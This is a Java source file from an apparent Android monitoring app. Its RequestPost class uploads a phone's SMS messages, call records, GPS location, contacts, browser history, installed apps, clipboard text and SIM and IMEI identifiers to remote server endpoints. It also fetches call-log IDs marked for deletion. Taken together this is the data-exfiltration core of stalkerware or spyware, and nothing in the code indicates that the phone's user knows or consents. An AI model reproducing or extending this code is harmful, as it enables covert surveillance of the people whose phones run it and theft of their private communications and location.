/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
/**
 * @author jitendrav
 *
 */
package com.hinj.app.utils;

import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.protocol.HTTP;
import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONTokener;

import android.content.Context;
import android.util.Log;

public class RequestPost {
	String smsResponce="",callResponce="",getResponceBrowser="",CurrentDate="";	
	Context mContext;
	
	/*****************************************************************/
	public String postRegDetail(String LicenceKey,String DeviceID,String deviceid_IMEI)
	{		
		try{
			Calendar c = Calendar.getInstance();
			//System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());	
			
			HttpClient client = new DefaultHttpClient();
			InputStream in = null;
			HttpPost post = new HttpPost(ConnectUrl.URL_registration);
			
			//HttpPost post = new HttpPost(URL_qing_number);
			StringEntity se = null;
			HttpResponse response = null;
			JSONObject schObject=new JSONObject();
		 	schObject.put("LicenceKey", LicenceKey);
		 	schObject.put("device_id", DeviceID);
		 	//schObject.put("device_os", "Android");
		 	schObject.put("imei_number", deviceid_IMEI);
			///System.out.println("sending" + schObject.toString());
			try {
				se = new StringEntity(schObject.toString());
				se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,"application/json"));
				post.setEntity(se);
				response = client.execute(post);
				if (response != null) {
					  in = response.getEntity().getContent();
				}
				callResponce=inputSteamToString(in);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
		return callResponce;
	}
	/*****************************************************************/	
	/*****************************************************************/
	public String postSmsPost(String smsdetail,String getUserID,String upload_device_id)
	{
		try{		
		//user_id,date_time(created), (RNo|||SNo|||Message|||Type|||MsgDate)			
		Calendar c = Calendar.getInstance();
		//System.out.println("Current time => " + c.getTime());
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		CurrentDate = df.format(c.getTime());	
			
		byte[] bytes = smsdetail.toString().getBytes("UTF-8");
		String getsmsDetail = new String(android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT));
		
		HttpClient client = new DefaultHttpClient();
		InputStream in = null;
		HttpPost post = new HttpPost(ConnectUrl.URL_SMS);
		
		//HttpPost post = new HttpPost(URL_qing_number);
		StringEntity se = null;
		HttpResponse response = null;
		JSONObject schObject=new JSONObject();
		schObject.put("date_time", CurrentDate);
		schObject.put("items", getsmsDetail);
		schObject.put("upload_device_id", upload_device_id);
		
		//System.out.println("sending" + schObject.toString());
		try {
			//Log.e("schObject ", schObject.toString());
			se = new StringEntity(schObject.toString());
			se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,"application/json"));
			post.setEntity(se);
			response = client.execute(post);
			if (response != null) {
				   in = response.getEntity().getContent();

			}
			smsResponce =inputSteamToString(in);
	    }
		catch (Exception e) {
			// TODO: handle exception
		e.printStackTrace();
		}
		}
		catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
		return smsResponce;
	}
	
	/*****************************************************************/
	public String postCallPost(String Calldetail,String getUserID,String upload_device_id)
	{
		try{
			Calendar c = Calendar.getInstance();
			//System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());			
			
			HttpClient client = new DefaultHttpClient();
			InputStream in = null;
			HttpPost post = new HttpPost(ConnectUrl.URL_Call);
			
			//HttpPost post = new HttpPost(URL_qing_number);
			StringEntity se = null;
			HttpResponse response = null;
			JSONObject schObject=new JSONObject();
			schObject.put("date_time", CurrentDate);			
			schObject.put("items", Calldetail);
			schObject.put("upload_device_id", upload_device_id);
			
			//System.out.println("sending Call Detail" + schObject.toString());
			try {
				se = new StringEntity(schObject.toString());
				se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
						"application/json"));
				post.setEntity(se);
				response = client.execute(post);
				if (response != null) {
					  in = response.getEntity().getContent();

				}
				callResponce=inputSteamToString(in);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
		return callResponce;
	}
	/*****************************************************************/
	public String postLatLongPost(double latitude,double longitude,String getUserID,String MobileNo,String deviceId)
	{
		try{
			Calendar c = Calendar.getInstance();
			//System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());			
		
			HttpClient client = new DefaultHttpClient();
			InputStream in = null;
			HttpPost post = new HttpPost(ConnectUrl.URL_gps_tracking);		
			StringEntity se = null;
			HttpResponse response = null;
			
			JSONObject Location1=new JSONObject();
			JSONObject Location=new JSONObject();
			Location.put("latitude",latitude);
			Location.put("longitude", longitude);
			Location.put("phone_time",CurrentDate);
		  
		    String json1 = "{" + "  \"locations\": [" + Location.toString() + "]" + "}";
		   
		    Log.i("json1*************************", json1);
		   
		    JSONObject object = (JSONObject) new JSONTokener(json1).nextValue();		  
		    JSONArray locations = object.getJSONArray("locations");
			JSONObject schObject=new JSONObject();			
			schObject.put("date_time", CurrentDate);
			schObject.put("phone_no",MobileNo);
		    schObject.put("items",locations);
		    schObject.put("upload_device_id", deviceId);
			
			//byte[] bytes = schObject.toString().getBytes("UTF-8");
			//String getlatLongDetail = new String(android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT));
			//System.out.println("sending" + schObject.toString());
			
			try {
				se = new StringEntity(schObject.toString());
				se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,"application/json"));
				post.setEntity(se);
				response = client.execute(post);
				if (response != null) {
					   in = response.getEntity().getContent();
				}
				 getResponceBrowser=inputSteamToString(in);
				
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		Log.i("getResponceBrowser{{{{{{{{{", getResponceBrowser);
		return getResponceBrowser;
	}

	
	public String inputSteamToString(InputStream is) {
		String response;
		StringBuffer responseInBuffer = new StringBuffer();
		byte[] b = new byte[4028];
		try {
			for (int n; (n = is.read(b)) != -1;) {
				responseInBuffer.append(new String(b, 0, n));
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		response = new String(responseInBuffer.toString());
		return response;
	}
	
	/************************Contact List Start*****************************************/
	public String postCallList(String Calldetail,String getDeviceID,String upload_device_id)
	{
		try{
			Calendar c = Calendar.getInstance();
			//System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());			
			
			HttpClient client = new DefaultHttpClient();
			InputStream in = null;
			HttpPost post = new HttpPost(ConnectUrl.URL_Contact_List);
			//HttpPost post = new HttpPost(URL_qing_number);
			StringEntity se = null;
			HttpResponse response = null;
			JSONObject schObject=new JSONObject();
			schObject.put("date_time", CurrentDate);
			/*schObject.put("device_os", "Android");*/
			schObject.put("items", Calldetail);
			schObject.put("upload_device_id", upload_device_id);
			
			//System.out.println("sending Call Detail" + schObject.toString());
			try {
				se = new StringEntity(schObject.toString());
				se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
						"application/json"));
				post.setEntity(se);
				response = client.execute(post);
				if (response != null) {
					  in = response.getEntity().getContent();

				}
				callResponce=inputSteamToString(in);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		return callResponce;
	}
	/*************************Contact List End****************************************/
	
	/*************************Browser Detail Post Start**********************************/

	public String postBrowserPost(String browserdetail,String getUserID,String upload_device_id) {
		String browserResponce="";
		try {

			Calendar c = Calendar.getInstance();
			// System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());

			HttpClient client = new DefaultHttpClient();
			InputStream in = null;
			HttpPost post = new HttpPost(ConnectUrl.URL_Browser);
			// HttpPost post = new HttpPost(URL_qing_number);
			StringEntity se = null;
			HttpResponse response = null;
			JSONObject schObject = new JSONObject();
			schObject.put("date_time", CurrentDate);
			schObject.put("items", browserdetail);
			schObject.put("upload_device_id", upload_device_id);
			
			// schObject.put("items", browserDetail);

			// System.out.println("sending" + schObject.toString());
			try {
				se = new StringEntity(schObject.toString());
				se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
						"application/json"));
				post.setEntity(se);
				response = client.execute(post);
				if (response != null) {
					in = response.getEntity().getContent();
				}
				browserResponce = inputSteamToString(in);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return browserResponce;
	}

	/*************************Browser Detail Post End************************************/
	
	/************************* Device Info List Start ****************************************/
	public String postDeviceInfoPost(ArrayList<String> getDeviceInfo, String getUserID,String upload_device_id) {
		try {

			Calendar c = Calendar.getInstance();
			// System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());

			HttpClient client = new DefaultHttpClient();
			InputStream in = null;
			HttpPost post = new HttpPost(ConnectUrl.URL_DEVICE_INFO);

			// HttpPost post = new HttpPost(URL_qing_number);
			
			StringEntity se = null;
			HttpResponse response = null;
			JSONObject schObject = new JSONObject();
			schObject.put("upload_device_id", upload_device_id);			
			schObject.put("device_os", "Android");
			schObject.put("key", getUserID);
			schObject.put("date_time", CurrentDate);
			schObject.put("device_name", getDeviceInfo.get(0));
			schObject.put("carrier_name",getDeviceInfo.get(1) );
			schObject.put("signal", getDeviceInfo.get(2));
			schObject.put("imsi_number", getDeviceInfo.get(3));
			schObject.put("iccid_number", getDeviceInfo.get(4));
			schObject.put("imei_number", getDeviceInfo.get(5));
			schObject.put("device_model", getDeviceInfo.get(6));
			schObject.put("device_idetifier",upload_device_id);
			schObject.put("wifi", getDeviceInfo.get(7));
			schObject.put("battery", getDeviceInfo.get(8));
			schObject.put("disk_space", getDeviceInfo.get(9));
			schObject.put("free_space", getDeviceInfo.get(10));
			schObject.put("bluetooth", getDeviceInfo.get(11));
			schObject.put("gps", getDeviceInfo.get(12));
			schObject.put("wifi_send", getDeviceInfo.get(13));
			schObject.put("wifi_receive", getDeviceInfo.get(14));
			schObject.put("sim_send", "");			

			try {
				se = new StringEntity(schObject.toString());
				se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
						"application/json"));
				post.setEntity(se);
				response = client.execute(post);
				if (response != null) {
					in = response.getEntity().getContent();
				}
				callResponce = inputSteamToString(in);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
		return callResponce;
	}
	/************************* Device Info List End ****************************************/

			//post installed app data to server
			
			public String postInstalledApplicaiton(String installedAppDetails, String getDeviceID,String userId,String upload_device_id) {
				try {
					Calendar c = Calendar.getInstance();
					// System.out.println("Current time => " + c.getTime());
					SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					CurrentDate = df.format(c.getTime());

					HttpClient client = new DefaultHttpClient();
					InputStream in = null;
					HttpPost post = new HttpPost(ConnectUrl.URL_Install_app);
					// HttpPost post = new HttpPost(URL_qing_number);
					StringEntity se = null;
					HttpResponse response = null;
					JSONObject schObject = new JSONObject();
					//schObject.put("device_id", getDeviceID);
					schObject.put("date_time", CurrentDate);
					//schObject.put("device_os", "Android");
					schObject.put("items", installedAppDetails);
					schObject.put("upload_device_id", upload_device_id);
					try {
						se = new StringEntity(schObject.toString());
						se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
								"application/json"));
						post.setEntity(se);
						response = client.execute(post);
						if (response != null) {
							in = response.getEntity().getContent();
						}
						callResponce = inputSteamToString(in);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				} catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
				return callResponce;
			}
			
		/*****************************Logging*/

			public static String callJson(String url, JSONObject parameters) throws Exception
			{
				HttpClient client = new DefaultHttpClient();
				InputStream in = null;

				HttpPost post = new HttpPost(url);
				StringEntity se = null;
				HttpResponse response = null;


				try {
					se = new StringEntity(parameters.toString());
					se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,"application/json"));
					post.setEntity(se);
					response = client.execute(post);

					if (response != null) 
					{
						in = response.getEntity().getContent();
					}
					return inputSteamToLogginString(in);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				return null;
			}
			
			public static String inputSteamToLogginString(InputStream is) {
				String response;
				StringBuffer responseInBuffer = new StringBuffer();
				byte[] b = new byte[4028];
				try {
					for (int n; (n = is.read(b)) != -1;) {
						responseInBuffer.append(new String(b, 0, n));
					}
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				response = new String(responseInBuffer.toString());
				return response;
			}
		
			/************************ClipBoard List Start*****************************************/
			public String postClipBoardText(String clipbord_detail, String getDeviceID, String upload_device_id)
			{
				try{
					
					HttpClient client = new DefaultHttpClient();
					InputStream in = null;
					HttpPost post = new HttpPost(ConnectUrl.URL_CLIPBOARD_TEXT);
					StringEntity se = null;
					HttpResponse response = null;
					JSONObject schObject=new JSONObject();
					schObject.put("clipboard_text", clipbord_detail);
					schObject.put("upload_device_id", upload_device_id);
					
					try {
						se = new StringEntity(schObject.toString());
						se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
								"application/json"));
						post.setEntity(se);
						response = client.execute(post);
						if (response != null) {
							  in = response.getEntity().getContent();

						}
						callResponce=inputSteamToString(in);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				catch (Exception e) {
					e.printStackTrace();
				}
				return callResponce;
			}
			/*************************ClipBoard List End****************************************/
			
			/************************Get Call Log Id for Deletion Start*****************************************/
			public String getCallLogDeleteId(String upload_device_id)
			{
				try{
					
					HttpClient client = new DefaultHttpClient();
					InputStream in = null;
					HttpPost post = new HttpPost(ConnectUrl.URL_GET_DELETE_CALL_LOG_ID);
					StringEntity se = null;
					HttpResponse response = null;
					JSONObject schObject=new JSONObject();
					schObject.put("upload_device_id", upload_device_id);
					
					try {
						se = new StringEntity(schObject.toString());
						se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE,
								"application/json"));
						post.setEntity(se);
						response = client.execute(post);
						if (response != null) {
							  in = response.getEntity().getContent();

						}
						callResponce=inputSteamToString(in);
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				catch (Exception e) {
					e.printStackTrace();
				}
				return callResponce;
			}
			/*************************Get Call Log Id for Deletion End****************************************/
}
